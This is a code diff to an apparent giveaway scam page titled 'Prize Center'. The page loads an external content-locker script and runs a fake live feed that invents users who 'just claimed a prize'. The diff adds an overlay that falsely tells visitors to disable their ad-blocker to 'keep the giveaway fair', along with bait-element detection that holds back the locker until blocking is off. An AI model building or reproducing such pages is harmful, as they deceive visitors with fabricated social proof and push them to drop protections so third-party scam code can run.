@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Prize Center</title>
 
 <!-- —————  BASIC STYLING  ————— -->
@@ -87,9 +87,40 @@
     @keyframes fadeSlide{
         to{opacity:1;transform:none}
     }
+
+    /* — Anti-AdBlock popup styles — */
+    #adblock-popup{
+        position:fixed; inset:0;
+        background:rgba(0,0,0,.85);
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        z-index:10000;          /* above everything */
+        display:none;
+    }
+    .adb-inner{
+        max-width:320px;
+        background:#111;
+        border:2px solid var(--neon);
+        border-radius:10px;
+        padding:1.8rem 1.2rem;
+        text-align:center;
+        box-shadow:0 0 15px var(--neon);
+    }
+    .adb-inner h2{margin-top:0;color:var(--neon);}
+    .adb-inner p{color:#ddd;line-height:1.4}
 </style>
 </head>
 <body>
+
+<!-- Anti‑AdBlock overlay (hidden by default) -->
+<div id="adblock-popup">
+  <div class="adb-inner">
+    <h2>🔒 Please Disable Ad‑Blocker</h2>
+    <p>We rely on this verification to keep the giveaway fair.<br />
+       Pause your ad‑blocker, then refresh the page.</p>
+  </div>
+</div>
 
 <h1>🎉 Claim Your Prize!</h1>
 <p class="tagline">Our system is processing recent winners…</p>
@@ -107,41 +138,58 @@
 
 <!-- —————  YOUR LOCKER SCRIPT  ————— -->
 <script>
-  /* keep these IDs/keys exactly as given */
   var drIwr_xIs_bBHMTc={it:4515670,key:"96c99"};
 </script>
 <script src="https://dfmpe7igjx4jo.cloudfront.net/4530bac.js"></script>
 
-<!-- —————  PAGE LOGIC  ————— -->
+<!-- —————  PAGE LOGIC INCLUDING ANTI-ADBLOCK ————— -->
 <script>
-/* 1) slide locker + open after 3 seconds */
- window.addEventListener('load', function () {
-      setTimeout(function () {
-        if (typeof _FD === 'function') _FD();
-      }, 2000);
-});
-
-/* 2) fake live‑feed generator */
+/* Fake live feed generator */
 const names=['kjoe.r','Elliot_92','mia.dev','cryptoCat','Luna007','alphaWolf',
              'SamuraiX','PixelPix','rover.ai','dani_chan','NeoBlade','AriaSky',
              'ZekePro','betaBeta','Helix42','NovaRay','SodaPop','qubitQ',
              'Jaxter','omegaLOL','hazard','Firefly','coderKid'];
 let seconds=4;
 function addFeed(){
-    const ul=document.getElementById('feed-items');
-    const name=names[Math.floor(Math.random()*names.length)];
-    const li=document.createElement('li');
-    li.className='feed-item';
-    li.textContent=`${name} just claimed a prize ${seconds} s ago`;
-    ul.prepend(li);
-    // keep max 20 items
-    if(ul.children.length>20) ul.lastElementChild.remove();
-    // randomize next seconds value
-    seconds=Math.floor(Math.random()*8)+2;
+  const ul=document.getElementById('feed-items');
+  const name=names[Math.floor(Math.random()*names.length)];
+  const li=document.createElement('li');
+  li.className='feed-item';
+  li.textContent=`${name} just claimed a prize ${seconds} s ago`;
+  ul.prepend(li);
+  if(ul.children.length>20) ul.lastElementChild.remove();
+  seconds=Math.floor(Math.random()*8)+2;
 }
-setInterval(addFeed,1500); // new entry every 1.5 s
-// seed initial list
+setInterval(addFeed,1500);
 for(let i=0;i<6;i++) addFeed();
+
+/* Anti-AdBlock detection */
+function adblockDetected(){
+  // Show the popup
+  document.getElementById('adblock-popup').style.display='flex';
+}
+function checkAdblockThenStart(){
+  // Create bait element
+  const bait=document.createElement('div');
+  bait.className='adsbox';
+  bait.style.height='1px';
+  bait.style.position='absolute';
+  bait.style.left='-999px';
+  document.body.appendChild(bait);
+
+  setTimeout(()=>{
+    const blocked = !bait.offsetParent || bait.offsetHeight===0;
+    bait.remove();
+    if(blocked){
+      adblockDetected();
+    }else{
+      // Open the locker after 2 seconds
+      setTimeout(()=>{ if(typeof _FD==='function'){ _FD(); } },2000);
+    }
+  },100);
+}
+
+window.addEventListener('load',checkAdblockThenStart);
 </script>
 
 </body>
